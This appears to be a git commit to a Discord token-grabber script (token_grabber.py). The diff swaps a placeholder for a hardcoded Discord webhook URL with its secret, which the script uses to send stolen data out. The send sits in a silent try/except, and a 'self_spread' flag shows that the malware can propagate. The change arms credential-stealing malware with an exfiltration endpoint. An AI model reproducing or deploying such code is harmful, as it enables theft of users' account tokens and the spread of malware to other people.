c73831152ed931722cdd9a3d32305a2eea581def
daronllanos <111622885+daronllanos@users.noreply.github.com>
2022-08-19 23:34:35 -0400

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1010388311371694100/iGa7wRN8D7G6msGxypdGEYOhS3i3wLKDqxlrvlHPfT4EgW5cfxGwizGTRQP4DEHqzV1S", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
